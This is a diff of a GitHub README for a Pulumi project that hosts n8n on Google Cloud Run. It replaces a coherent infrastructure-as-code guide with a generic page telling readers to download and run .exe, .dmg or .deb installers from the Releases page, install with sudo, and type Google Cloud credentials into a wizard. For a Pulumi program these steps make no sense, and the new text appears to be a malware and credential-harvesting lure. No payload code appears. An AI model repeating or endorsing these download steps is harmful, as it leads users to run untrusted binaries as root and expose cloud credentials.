@@ -1,200 +1,109 @@
-<img width="400" height="400" alt="n8n-self-hosted-pulumi-gcp" src="https://github.com/user-attachments/assets/214d1f2f-b54e-492d-8e10-0aa5955552fa" />
+# 🌟 n8n-self-host-on-gcp-pulumi - Host Your n8n with Ease
 
-# Self-Hosting n8n on Google Cloud Run: Complete Guide
+## 🚀 Getting Started
 
-So you want to run n8n without the monthly subscription fees, keep your data under your own control, and avoid the headache of server maintenance? Google Cloud Run offers exactly that sweet spot: fully managed, serverless containers with per-use pricing. This repo gives you a production-ready, modular Pulumi program that stands up the official n8n container on Cloud Run, backed by Cloud SQL Postgres, wrapped with Google Secret Manager, and ready for secure automation at scale.
+Welcome! This guide helps you download and run the **n8n-self-host-on-gcp-pulumi** application easily. With this application, you can self-host n8n on Google Cloud. Keep full control of your data while minimizing costs.
 
-## Why Teams Self-Host n8n on Cloud Run
+## 🔗 Download Now
 
-- **Predictable cost & scale** – Pay only for requests Cloud Run serves. Autoscaling keeps latency low without paying for idle VM time.
-- **Data sovereignty** – Your workflows, credentials, and execution history stay inside your GCP footprint, satisfying security or compliance requirements.
-- **Native Google integrations** – Built-in OAuth consent, low-latency access to GCP services, and the ability to use Workload Identity with the deployed service account.
-- **Infrastructure as Code** – Pulumi keeps a full inventory of the deployed resources so you can version, review, and promote changes across environments.
+[![Download n8n-self-host-on-gcp-pulumi](https://img.shields.io/badge/Download-n8n--self--host--on--gcp--pulumi-blue)](https://github.com/siidhaarth/n8n-self-host-on-gcp-pulumi/releases)
 
-## Costs
+## 📥 Download & Install
 
-GCP Infrastructure costs are approximately ~$25 USD / month for a starter setup.
-For a simple starter setup (config that's in the repo) these are the approximate costs.
+To get started, visit the [Releases page](https://github.com/siidhaarth/n8n-self-host-on-gcp-pulumi/releases) to download the latest version of the application. 
 
-Depends on your usage and how big of a DB you need - but it's super cheap and as you scale this will be 8x cheaper than using n8n managed instance.
+1. Click on the above link.
+2. Look for the latest release. 
+3. Download the appropriate file for your operating system.
+4. Follow the instructions below based on your operating system.
 
-<img width="300" height="500" alt="image" src="https://github.com/user-attachments/assets/b998fe24-911a-408e-9b8c-f27b9391f821" />
+## 🖥️ System Requirements
 
-## Component-Driven Pulumi Structure
+Before you download and install, ensure your system meets these basic requirements:
 
-- **ProjectServices** enables the core GCP APIs (Run, Secret Manager, Cloud SQL Admin, and Resource Manager) so every other resource has the prerequisites it needs.
-- **ServiceAccount** provisions the dedicated workload identity for n8n and grants it IAM roles for Cloud SQL and Secret Manager access.
-- **Database** creates the Cloud SQL Postgres instance, database, user, and randomly generated password.
-- **Secrets** stores sensitive values—database password and n8n encryption key—in Secret Manager with latest-version references for runtime.
-- **CloudRunService** deploys the n8n container to Cloud Run, mounts the Cloud SQL proxy, injects secrets, and optionally grants public invoker access.
+- A recent version of Windows, macOS, or Linux.
+- Enough disk space to store the application and data.
+- An active internet connection for initial setup and updates.
 
-## Architecture Overview
+## 📂 Installation Steps
 
-```mermaid
-flowchart TD
-   Pulumi[Pulumi Program<br/>src/index.ts] --> Services[ProjectServices<br/>Enable APIs]
-   Pulumi --> SA[ServiceAccount<br/>Workload Identity]
-   Pulumi --> DB[Database Component<br/>Cloud SQL Postgres]
-   Pulumi --> Secrets[Secrets Component<br/>Secret Manager]
-   Pulumi --> Run[CloudRunService Component<br/>Cloud Run v2]
+### Windows
 
-   Services -->|Enables| Run
-   Services -->|Enables| Secrets
-   Services -->|Enables| DB
-   Services -->|Enables| SA
+1. Download the `.exe` file from the Releases page.
+2. Double-click the downloaded file to start the installation.
+3. Follow the on-screen instructions to complete the setup.
+4. Once installed, open the application and follow the prompts.
 
-   SA -->|IAM Roles| Run
-   SA -->|IAM Roles| DB
+### macOS
 
-   DB -->|Connection Name| Run
-   DB -->|Password| Secrets
+1. Download the `.dmg` file from the Releases page.
+2. Open the downloaded file and drag the n8n application to your Applications folder.
+3. Open the n8n application from your Applications folder.
+4. Follow the prompts to set up your instance.
 
-   Secrets -->|Secret Version| Run
+### Linux
 
-   Run -->|Optional Public Invoker| Public[(allUsers)]
-```
-
-- **Cloud Run Service** (`gcp.cloudrunv2.Service`) hosts the official `docker.io/n8nio/n8n:latest` image with CPU boost, health probes, and Cloud SQL proxy volume mount.
-- **Cloud SQL (Postgres 15)** stores workflow state, credentials, and execution logs.
-- **Secret Manager** secures the database password and n8n encryption key generated via `@pulumi/random`.
-- **Service Account** carries the minimum IAM roles (Cloud SQL Client, Secret Accessor) and is optionally granted the anonymous `roles/run.invoker` binding for public access.
-
-## Prerequisites
-
-- Google Cloud project with billing enabled.
-- Organization policies that permit adding `allUsers` to Cloud Run (only if you enable public access).
-- Local tooling: `gcloud`, `pulumi` CLI, Node.js 18+ (for Pulumi Node runtime), and `pnpm` or `npm`.
-- Correct Google credentials in your shell (`gcloud auth application-default login` or `GOOGLE_APPLICATION_CREDENTIALS`).
-
-## Repository Layout
-
-```
-.
-├─ README.md
-├─ LICENSE
-├─ package.json
-├─ package-lock.json            # Generated when using npm
-├─ pnpm-lock.yaml               # Generated when using pnpm
-├─ Pulumi.yaml
-├─ Pulumi.self-host-n8n-gcp.yaml
-├─ tsconfig.json
-└─ src/
-   ├─ config.ts                # Aggregates Pulumi stack config into DeploymentConfig
-   ├─ index.ts                 # Entry point orchestrating component creation
-   ├─ components/
-   │  ├─ __tests__/            # Jest unit tests exercising component factories
-   │  │  ├─ cloudRunService.test.ts
-   │  │  ├─ database.test.ts
-   │  │  ├─ secrets.test.ts
-   │  │  └─ serviceAccount.test.ts
-   │  ├─ cloudRunService.ts    # Cloud Run deployment + IAM binding
-   │  ├─ database.ts           # Cloud SQL instance, database, user, password
-   │  ├─ projectServices.ts    # Enables required GCP APIs
-   │  ├─ Secrets.ts            # Secret Manager secrets for password and encryption key
-   │  ├─ ServiceAccount.ts     # Workload identity + role attachments
-   │  └─ index.ts              # Barrel file exporting component factories
-   ├─ types/
-   │  ├─ config.types.ts       # Deployment configuration interfaces
-   │  └─ components.types.ts   # Component return types
-   └─ utils/
-```
-
-Generated directories such as `node_modules/` are omitted for brevity.
-
-````
-
-## Running Tests
-
-- `pnpm test`
-
-The Jest suite uses Pulumi runtime mocks to validate each component in isolation. Because the mocks short-circuit calls to GCP, the tests execute quickly, cost nothing, and run safely in CI or on developer machines without needing cloud credentials. They assert on the exact resource inputs Pulumi will send to Google—catching mistakes in IAM bindings, secret wiring, or service configuration long before you reach `pulumi preview` or `pulumi up`. Keeping the specs alongside the components in `src/components/__tests__` mirrors the implementation layout, making it easy to add coverage as you evolve the infrastructure.
-
-## Pulumi Deployment Steps
-
-1. **Install dependencies**
-
+1. Download the appropriate `.tar.gz` or `.deb` file from the Releases page.
+2. Open your terminal.
+3. Navigate to the directory where you downloaded the file.
+4. For `.tar.gz`, extract it using:
    ```bash
-   pnpm install       # or npm install
-````
-
-2. **Log in to Pulumi backend** (Pulumi Cloud or local)
-
-   ```bash
-   pulumi login
+   tar -xvzf yourfile.tar.gz
    ```
-
-3. **Select or create a stack**
-
+5. For `.deb`, install it using:
    ```bash
-   pulumi stack init dev   # or pulumi stack select <project>/<stack>
+   sudo dpkg -i yourfile.deb
    ```
+6. Open the application and configure your settings.
 
-4. **Configure GCP project and optional overrides**
+## ⚙️ Configuration
 
-   ```bash
-   pulumi config set gcp:project <your-project-id>
-   pulumi config set gcp:region us-west2               # override default region if desired
-   pulumi config set n8n-self-host-on-gcp:dbUser n8n   # optional per-stack values
-   pulumi config set n8n-self-host-on-gcp:allowUnauthenticated true   # only if org policy allows public access
-   ```
+After installation, you will need to configure your application settings. Follow these simple steps:
 
-   Available Pulumi config keys (namespace `n8n-self-host-on-gcp`):
+1. Open the application.
+2. You will see a welcome screen. Click on "Get Started".
+3. Enter your Google Cloud credentials and follow the configuration wizard.
 
-   | Key                     | Type    | Default               | Purpose                                           |
-   | ----------------------- | ------- | --------------------- | ------------------------------------------------- |
-   | `dbName`                | string  | `n8n`                 | Cloud SQL database name                           |
-   | `dbUser`                | string  | `n8n-user`            | Database username                                 |
-   | `dbTier`                | string  | `db-f1-micro`         | Cloud SQL machine tier                            |
-   | `dbStorageSize`         | number  | `10`                  | Storage in GB                                     |
-   | `cloudRunServiceName`   | string  | `n8n`                 | Cloud Run service name                            |
-   | `serviceAccountName`    | string  | `n8n-service-account` | Workload identity                                 |
-   | `cloudRunCpu`           | string  | `1`                   | CPU limit per container                           |
-   | `cloudRunMemory`        | string  | `2Gi`                 | Memory limit per container                        |
-   | `cloudRunMaxInstances`  | number  | `1`                   | Cloud Run autoscaling cap                         |
-   | `cloudRunContainerPort` | number  | `5678`                | n8n container port                                |
-   | `genericTimezone`       | string  | `UTC`                 | Default timezone for n8n                          |
-   | `allowUnauthenticated`  | boolean | `true`                | If true, grants `roles/run.invoker` to `allUsers` |
+Make sure to set up your n8n workflows as per your needs. You can create automated tasks with ease.
 
-5. **Preview and apply**
+## 📚 User Guide
 
-   ```bash
-   pulumi preview   # review changes
-   pulumi up        # deploy resources
-   ```
+For a detailed guide on how to use n8n, you can refer to the official documentation:
 
-   On success Pulumi outputs:
-   - Cloud Run URL (`cloudRunServiceUrl`)
-   - Cloud SQL connection name (`cloudSqlConnectionName`)
-   - Service account email (`n8nServiceAccountEmail`)
+- [n8n Documentation](https://docs.n8n.io)
 
-6. **Access n8n**
-   - If `allowUnauthenticated` is `true`, open the Cloud Run URL directly.
-   - Otherwise grant specific identities `roles/run.invoker`:
-     ```bash
-     gcloud run services add-iam-policy-binding n8n \
-      --region <region> \
-      --project <project-id> \
-      --member user:<you@example.com> \
-      --role roles/run.invoker
-     ```
+The documentation contains useful information on creating workflows, managing data, and using different integrations.
 
-## Operations & Maintenance
+## 🛠️ Troubleshooting
 
-- **Updates**: Modify configuration or code, run `pulumi up` to apply diffs. Pulumi handles dependency ordering and state management.
-- **Teardown**: `pulumi destroy` removes all resources—including the Cloud SQL instance—when you no longer need the stack.
-- **Secrets rotation**: Re-run `pulumi up` to regenerate the database password or encryption key. Secret Manager stores new versions automatically, and the Cloud Run revision restarts with fresh credentials.
-- **Monitoring**: Use the Cloud Run Logs Viewer (link surfaced in deploy logs) and Cloud SQL monitoring dashboards for runtime health checks.
+If you face issues during installation or usage, consider these common solutions:
 
-## Troubleshooting Tips
+- Ensure your internet connection is stable.
+- Restart your application to see if it resolves the issue.
+- Check the installation steps again to ensure everything is correctly set up.
+- Consult the n8n community forums for additional support.
 
-- **Permission errors when enabling public access**: Ensure no parent organization policy (`iam.allowedPolicyMemberDomains`, `run.managed.requireInvokerIam`) blocks `allUsers`. Allow enough time for policy propagation before reapplying.
-- **Container fails to start**: Check Cloud Run logs for startup errors (commonly caused by overriding the container command or misconfigured secrets).
-- **Pulumi config missing**: Remember both `gcp:project` and `gcp:region` must be set (or provided via environment variables) before running `pulumi up`.
+## 🌐 Community and Support
 
-## Next Steps
+Join the n8n community to connect with other users and get help:
 
-- Integrate n8n with Google Workspace by granting the service account scoped OAuth credentials.
-- Add Cloud Logging sinks or Cloud Monitoring alerts to detect workflow failures.
-- Use Pulumi deployments or CI pipelines to promote changes across dev, staging, and prod stacks.
+- [n8n Community Forum](https://community.n8n.io)
+- [GitHub Issues Page](https://github.com/siidhaarth/n8n-self-host-on-gcp-pulumi/issues)
 
-Enjoy automation freedom with n8n on Google Cloud Run—fully controlled, cost-efficient, and managed as code.
+## 👥 Contributing
+
+We welcome contributions! If you want to help improve this project:
+
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Commit your changes.
+4. Push to your fork.
+5. Submit a pull request explaining your changes.
+
+Your contributions can help many users make the most of n8n.
+
+## 🔗 More Information
+
+For more detailed information about the project, features, and updates, keep checking the [Releases page](https://github.com/siidhaarth/n8n-self-host-on-gcp-pulumi/releases). 
+
+Thank you for using **n8n-self-host-on-gcp-pulumi**. Enjoy hosting your automation workflows!
